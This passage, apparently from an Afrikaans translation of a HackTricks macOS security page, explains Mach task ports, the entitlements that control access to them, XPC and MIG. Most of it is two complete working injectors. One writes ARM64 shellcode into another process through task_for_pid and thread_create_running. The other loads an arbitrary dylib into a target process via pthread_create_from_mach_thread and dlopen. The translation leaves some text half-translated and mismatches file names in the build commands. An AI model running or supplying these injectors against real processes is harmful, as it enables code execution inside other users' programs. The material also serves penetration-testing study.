* `task_[get/set]_state`: Beheer taaktoestand
* en meer kan gevind word in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

{% hint style="danger" %}
Let daarop dat met 'n STUUR reg oor 'n taakpoort van 'n **verskillende taak**, is dit moontlik om sulke aksies oor 'n verskillende taak uit te voer.
{% endhint %}

Verder is die taak_poort ook die **`vm_map`** poort wat toelaat om **geheue te lees en te manipuleer** binne 'n taak met funksies soos `vm_read()` en `vm_write()`. Dit beteken basies dat 'n taak met STUUR regte oor die taak_poort van 'n ander taak in staat sal wees om **kode in daardie taak in te spuit**.

Onthou dat omdat die **kernel ook 'n taak is**, as iemand daarin slaag om 'n **STUUR toestemmings** oor die **`kernel_task`** te kry, sal dit in staat wees om die kernel enige iets te laat uitvoer (jailbreaks).

* Roep `mach_task_self()` aan om die **naam te kry** vir hierdie poort vir die aanroeperstaak. Hierdie poort word slegs **geërf** oor **`exec()`**; 'n nuwe taak wat geskep is met `fork()` kry 'n nuwe taakpoort (as 'n spesiale geval, kry 'n taak ook 'n nuwe taakpoort na `exec()` in 'n suid-binêre lêer). Die enigste manier om 'n taak te skep en sy poort te kry, is om die ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) uit te voer terwyl 'n `fork()` gedoen word.
* Hierdie is die beperkings om toegang tot die poort te verkry (vanaf `macos_task_policy` van die binêre lêer `AppleMobileFileIntegrity`):
* As die program die **`com.apple.security.get-task-allow` toestemming** het, kan prosesse van dieselfde gebruiker toegang tot die taakpoort kry (gewoonlik bygevoeg deur Xcode vir foutopsporing). Die **notariseringsproses** sal dit nie toelaat vir produksie vrystellings nie.
* Programme met die **`com.apple.system-task-ports` toestemming** kan die taakpoort vir enige proses kry, behalwe die kernel. In ouer weergawes was dit genoem **`task_for_pid-allow`**. Dit word slegs aan Apple-toepassings toegeken.
* **Root kan toegang tot taakpoorte** van programme kry wat nie met 'n **versterkte** hardloopomgewing saamgestel is nie (en nie van Apple nie).

**Die taaknaampoort:** 'n Onbevoorregte weergawe van die _taakpoort_. Dit verwys na die taak, maar laat nie toe om dit te beheer nie. Die enigste ding wat deur dit beskikbaar lyk te wees, is `task_info()`.

### Shellcode-inspuiting in draad via Taakpoort

Jy kan 'n shellkode kry van:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 
### Toestemmings

Hierdie lêer bevat die toestemmings wat aan die toepassing toegeken is om spesifieke aksies uit te voer. Dit is belangrik om die toestemmings van 'n toepassing te verstaan om te bepaal of dit onnodige of potensieel skadelike aksies kan uitvoer. 
{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Kompileer** die vorige program en voeg die **bevoegdhede** by om kode in te spuit met dieselfde gebruiker (as nie, sal jy **sudo** moet gebruik).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</besonderhede>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
Om dit op iOS te laat werk, het jy die toestemming `dynamic-codesigning` nodig om 'n skryfbare geheue uitvoerbaar te maak.
{% endhint %}

### Dylib Ins spuiting in draad via Taakpoort

Op macOS kan **drade** gemanipuleer word via **Mach** of deur die gebruik van die **posix `pthread` api**. Die draad wat ons in die vorige inspuiting gegenereer het, is gegenereer met behulp van die Mach api, dus **dit is nie posix voldoenend nie**.

Dit was moontlik om 'n eenvoudige shell-kode in te spuit om 'n bevel uit te voer omdat dit **nie met posix voldoenende api's hoef te werk nie**, slegs met Mach. **Meer komplekse inspuitings** sou die **draad** ook **posix voldoenend** moet wees.

Daarom, om die draad te **verbeter**, moet dit **`pthread_create_from_mach_thread`** aanroep wat 'n geldige pthread sal skep. Dan kan hierdie nuwe pthread **dlopen** aanroep om 'n dylib van die stelsel te **laai**, sodat dit moontlik is om aangepaste biblioteke te laai in plaas daarvan om nuwe shell-kode te skryf om verskillende aksies uit te voer.

Jy kan **voorbeeld dylibs** vind (byvoorbeeld een wat 'n log genereer en dan daarnaar kan luister):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Kan nie geheue-toestemmings instel vir kode van afgeleë draad nie: Fout %s\n", mach_error_string(kr));
return (-4);
}

// Stel die toestemmings op die toegewysde stokgeheue in
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Kan nie geheue-toestemmings instel vir stok van afgeleë draad nie: Fout %s\n", mach_error_string(kr));
return (-4);
}


// Skep draad om shellkode uit te voer
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // dit is die werklike stok
//remoteStack64 -= 8;  // nodig uitlyn van 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Afgeleë Stok 64  0x%llx, Afgeleë kode is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Kan nie afgeleë draad skep nie: fout %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Gebruik: %s _pid_ _aksie_\n", argv[0]);
fprintf (stderr, "   _aksie_: pad na 'n dylib op skyf\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib nie gevind nie\n");
}

}
```
</besonderhede>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Draadkaping via Taakpoort <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In hierdie tegniek word 'n draad van die proses gekaap:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Basiese Inligting

XPC, wat staan vir XNU (die kernel wat deur macOS gebruik word) interproseskommunikasie, is 'n raamwerk vir **kommunikasie tussen prosesse** op macOS en iOS. XPC bied 'n meganisme vir die maak van **veilige, asynchrone metode-oproepe tussen verskillende prosesse** op die stelsel. Dit is 'n deel van Apple se sekuriteitsparadigma, wat die **skepping van voorreg-geskeide toepassings** moontlik maak waar elke **komponent** met **slegs die toestemmings wat dit nodig het** om sy werk te doen, hardloop, en sodoende die potensiële skade van 'n gekompromitteerde proses beperk.

Vir meer inligting oor hoe hierdie **kommunikasie werk** en hoe dit **kwesbaar kan wees**, kyk:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG is geskep om die proses van Mach IPC-kode-skepping te **vereenvoudig**. Dit is omdat baie van die werk om RPC te programmeer dieselfde aksies behels (argumnte inpak, die boodskap stuur, die data in die bediener ontpak...).

MIC genereer basies die benodigde kode sodat die bediener en kliënt met 'n gegewe definisie (in IDL -Interface Definition Language-) kan kommunikeer. Selfs al is die gegenereerde kode lelik, 'n ontwikkelaar sal dit net hoef in te voer en sy kode sal baie eenvoudiger wees as voorheen.

Vir meer inligting, kyk:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Verwysings

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
